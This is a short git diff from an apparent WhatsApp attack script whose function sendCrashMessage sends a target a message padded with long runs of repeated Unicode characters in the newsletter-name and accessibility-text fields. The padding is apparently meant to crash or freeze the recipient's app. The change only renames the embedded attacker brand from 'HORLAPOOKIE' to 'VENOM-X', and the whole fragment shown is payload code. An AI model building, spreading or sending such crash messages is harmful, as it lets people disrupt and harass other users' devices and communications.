@@ -70,9 +70,9 @@ async function sendCrashMessage(sock, target) {
         forwardedNewsletterMessageInfo: {
           newsletterJid: "120363420551846782@newsletter",
           serverMessageId: 1,
-          newsletterName: `ALTER WHATSAPP HORLAPOOKIE☠️ ${"ꥈ".repeat(15)}`,
+          newsletterName: `ALTER WHATSAPP VENOM-X☠️ ${"ꥈ".repeat(15)}`,
           contentType: 3,
-          accessibilityText: `HORLAPOOKIE SORRY 😐 💢 ${"﹏".repeat(2048)}`
+          accessibilityText: `VENOM-X SORRY 😐 💢 ${"﹏".repeat(2048)}`
         },
         interactiveMessage: {
           contextInfo: {
